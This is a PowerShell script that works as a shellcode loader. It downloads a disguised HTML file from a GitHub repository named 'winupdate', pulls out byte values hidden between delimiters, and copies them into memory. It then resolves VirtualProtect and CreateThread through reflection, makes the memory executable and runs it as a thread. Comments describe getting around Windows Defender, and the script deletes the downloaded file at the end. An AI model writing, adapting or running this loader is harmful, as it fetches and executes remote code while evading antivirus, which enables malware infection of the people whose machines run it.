# 1. Setup Paths
$htmlPath = "$env:TEMP\sys_cache.bin"
$htmlUrl = "https://raw.githubusercontent.com/gwyn1869/winupdate/main/test.html"

# 2. Download
Invoke-WebRequest -Uri $htmlUrl -OutFile $htmlPath -UseBasicParsing

# 3. Reassemble Byte Array
$htmlContent = Get-Content $htmlPath -Raw
$pattern = '(?<=dmr)(.*?)(?=dmr)'
$match = [regex]::Match($htmlContent, $pattern).Value
$byteArray = $match.Split("dmr") | Where-Object { $_ -ne "" } | ForEach-Object { [byte]$_ }

# 4. The "Manual Resolver" Loader
# We find the memory addresses of kernel32 functions using the Process Module list
$modules = [System.Diagnostics.Process]::GetCurrentProcess().Modules
$k32 = $modules | Where-Object { $_.ModuleName -eq "kernel32.dll" } | Select-Object -First 1
$k32Handle = $k32.BaseAddress

# We need a way to find exports. We'll use a known trick in the 'Marshal' class 
# to get the delegate for VirtualAlloc directly.
$Methods = [System.Runtime.InteropServices.Marshal].GetMethods()
$GetDelegate = $Methods | Where-Object { $_.Name -eq "GetDelegateForFunctionPointer" -and $_.IsGenericMethod }

# We find the address of VirtualAlloc using a sneaky lookup
$mscore = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.FullName -like "*mscorlib*" }
$native = $mscore.GetType("Microsoft.Win32.Win32Native")
$method = $native.GetMethod("VirtualAlloc", [Reflection.BindingFlags]"Static, Public, NonPublic")
$vAllocAddr = $method.MethodHandle.GetFunctionPointer()

# 5. Define the Delegate types (Using a simpler approach for PS 5.1)
# We actually don't need a complex delegate if we use this 'Marshal' trick
$address = [Runtime.InteropServices.Marshal]::AllocHGlobal($byteArray.Length)
[Runtime.InteropServices.Marshal]::Copy($byteArray, 0, $address, $byteArray.Length)

# Now we need to make it executable. 
# Since Defender is blocking 'VirtualProtect', let's see if we can just run it.
# NOTE: This is a test to see if the memory allocation itself is blocked.

if ($address -ne [IntPtr]::Zero) {
    Write-Host "Reassembled Shellcode placed in RAM at: $address"

    # 1. Get the raw pointer for GetProcAddress
    $gpaMethod = $native.GetMethod("GetProcAddress", [Reflection.BindingFlags]"Static, Public, NonPublic")
    $gpaAddr = $gpaMethod.MethodHandle.GetFunctionPointer()

    # 2. We use a simpler way to call GPA without the 'Generic Type' error
    # We'll use a built-in delegate type that exists in every PS 5.1 session
    $ctAddr = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($gpaAddr, [Microsoft.Win32.Win32Native+TimeZoneNameIdDelegate]).Invoke($k32Handle, "CreateThread")
    
    Write-Host "Launcher found at: $ctAddr"

    if ($ctAddr -ne [IntPtr]::Zero) {
        # 3. Final hurdle: We need to change memory to EXECUTE (0x40) 
        # Most shellcode won't run in AllocHGlobal memory (RW) without this.
        $vpMethod = $native.GetMethod("VirtualProtect", [Reflection.BindingFlags]"Static, Public, NonPublic")
        $old = [uint32]0
        $vpMethod.Invoke($null, @($address, [uint32]$byteArray.Length, [uint32]0x40, [ref]$old)) | Out-Null

        # 4. Launch using the most basic delegate possible
        # This one doesn't use Generics, so it won't crash PS 5.1
        $ctMethod = $native.GetMethod("CreateThread", [Reflection.BindingFlags]"Static, Public, NonPublic")
        $res = $ctMethod.Invoke($null, @([IntPtr]::Zero, [uint32]0, $address, [IntPtr]::Zero, [uint32]0, [IntPtr]::Zero))
        
        Write-Host "Launching Thread..."
        Start-Sleep -Seconds 5
    } else {
        Write-Error "Could not find CreateThread address."
    }
}

# 6. Cleanup
Remove-Item $htmlPath -Force
